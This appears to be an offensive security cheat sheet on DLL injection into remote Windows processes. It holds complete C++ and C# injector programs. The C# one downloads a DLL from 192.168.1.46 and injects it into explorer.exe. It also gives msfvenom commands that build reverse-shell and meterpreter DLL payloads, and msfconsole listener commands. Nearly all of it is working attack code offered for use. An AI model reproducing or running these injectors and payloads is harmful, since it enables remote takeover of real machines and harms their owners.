## DLL inject Remote process

### DLL Injection with CPP

dll-inject.cpp

```cpp
#include <iostream>
#include <Windows.h>
#include <iomanip>


int main(int argc, char* argv[]) {
HANDLE processHandle;
PVOID remoteBuffer;
wchar_t dllPath[] = TEXT("E:\\Execution\\injection\\mswin.dll");

printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
//open process to obtain handles
processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
// Allocate the space for injecting the path of the malicious DLL file to the target process 
remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
// Write the path of the DLL into the allocated space
WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
// Retrieve the address of LoadLibrary from kernel32.dll, that given the path to DLL, loads it into memory 
PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
// Call CreateRemoteThread passing it the address of LoadLibrary causing the injected DLL file’s path to be loaded into memory and executed.
CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
CloseHandle(processHandle);

return 0;
}
```

### payload

* `mswin.dll` genetrate dll payload 
  
  ```command
  msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f dll > /var/www/html/msin.dll
  ```
  
  ### listener
  
  ```bash
  msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/shell/reverse_tcp; exploit"
  ```

### DLL Injection Wi Csharp

Dllinjection.cs

```csharp
using System;
using System.Diagnostics; using System.Net;
using System.Runtime.InteropServices; 
using System.Text;
namespace Inject
{
        class Program
        {
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
processId);
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
public static extern IntPtr GetModuleHandle(string lpModuleName);
static void Main(string[] args) {
String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
String dllName = dir + "\\nss.dll";
WebClient wc = new WebClient(); wc.DownloadFile("http://192.168.1.46/nss.dll", dllName);
Process[] expProc = Process.GetProcessesByName("explorer"); int pid = expProc[0].Id;
IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40); IntPtr outSize;
Boolean res = WriteProcessMemory(hProcess, addr,
Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"),
"LoadLibraryA");
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib,
addr, 0, IntPtr.Zero); }
} 
}
```

#### payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.46 LPORT=443  -f dll -o /var/www/html/nss.dll
```

#### listener

```bash
msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/shell/reverse_tcp; exploit"
```
